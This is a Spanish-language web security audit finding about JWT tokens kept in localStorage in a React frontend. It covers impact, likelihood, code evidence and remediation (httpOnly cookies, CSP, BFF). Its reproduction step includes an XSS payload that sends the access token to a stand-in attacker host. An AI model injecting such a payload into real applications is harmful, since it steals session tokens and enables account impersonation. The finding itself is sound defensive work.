# JWT tokens almacenados en localStorage

**ID:** WA-2026-0001
**Severidad:** Medium
**OWASP Top 10:** A03 — Injection (XSS), A05 — Security Misconfiguration
**OWASP WSTG:** WSTG-SESS-01, WSTG-INPV-01
**ASVS:** 3.1.1, 3.2.1
**Estado:** Open
**Fecha:** 2026-07-07
**Auditor:** Security Team

---

## Descripción

Los JWT de acceso y refresco se almacenan en `localStorage` del navegador en el frontend React (`frontend/src/services/api-client.ts:5-6`). Cualquier vulnerabilidad XSS en la aplicación permitiría a un atacante robar los tokens mediante `localStorage.getItem('verp_access_token')`.

## Impacto

Un atacante con XSS puede robar los tokens JWT y suplantar al usuario, accediendo a todas las APIs de IAM y CRM con los permisos de la víctima.

## Probabilidad

Media — React escapa XSS por diseño, pero no hay CSP configurado ni httpOnly cookies.

## Condición

- El atacante debe encontrar un XSS (reflejado, almacenado o DOM-based)
- No hay CSP que mitigue la exfiltración de datos

## Reproducción

1. Identificar un input vulnerable a XSS (campo de lead, contacto, etc.)
2. Inyectar: `<script>fetch('https://attacker.com/steal?token=' + localStorage.getItem('verp_access_token'))</script>`
3. El token es exfiltrado al servidor del atacante

## Evidencia

`frontend/src/services/api-client.ts:5-6`:
```
const TOKEN_KEY = 'verp_access_token'
const REFRESH_KEY = 'verp_refresh_token'
...
function getAccessToken(): string | null {
  return localStorage.getItem(TOKEN_KEY)
}
```

## Recomendación

- Migrar tokens a httpOnly cookies con Secure + SameSite=Strict
- Implementar CSP headers restrictivos
- Usar patrón BFF (Backend for Frontend) para manejo de sesiones

## Código sugerido

```typescript
// Alternativa: usar httpOnly cookies manejadas por el servidor
// El frontend nunca toca los tokens directamente
// La cookie se envía automáticamente en cada request
```
